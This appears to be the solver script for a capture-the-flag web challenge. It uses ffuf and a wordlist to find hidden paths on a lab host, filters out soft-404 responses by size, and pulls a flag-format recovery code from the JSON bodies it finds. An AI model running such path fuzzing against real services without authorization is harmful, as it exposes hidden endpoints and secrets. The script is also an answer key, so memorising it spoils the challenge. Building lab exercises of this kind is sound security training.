#!/bin/bash
set -euo pipefail
work=$(mktemp -d /tmp/quiet-route.XXXXXX)
trap 'rm -rf "$work"' EXIT
for path in does-not-exist another-missing; do
    test "$(curl -sS --max-time 5 -o "$work/$path" -w '%{http_code}' "http://app:8000/$path")" = 200
done
cmp "$work/does-not-exist" "$work/another-missing"
size=$(wc -c < "$work/does-not-exist")
ffuf -w files/paths.txt -u http://app:8000/FUZZ -fs "$size" -t 2 -rate 10 -maxtime 15 -timeout 3 -noninteractive -of json -o "$work/candidates.json" >&2
jq -er '.results[].url' "$work/candidates.json" > "$work/urls"
while IFS= read -r url; do
    code=$(curl -sS --max-time 5 -o "$work/body" -w '%{http_code}' "$url")
    if [ "$code" != 200 ]; then continue; fi
    value=$(jq -r '.recovery_code // empty' "$work/body")
    if [[ "$value" =~ ^pwnden\{[^}]+\}$ ]]; then printf '%s\n' "$value"; exit 0; fi
done < "$work/urls"
if [ "$(curl -sS --max-time 5 -o "$work/denied" -w '%{http_code}' http://app:8000/ops-check)" = 403 ]; then exit 3; fi
printf '%s\n' 'No recovery code in candidate response bodies' >&2
exit 1
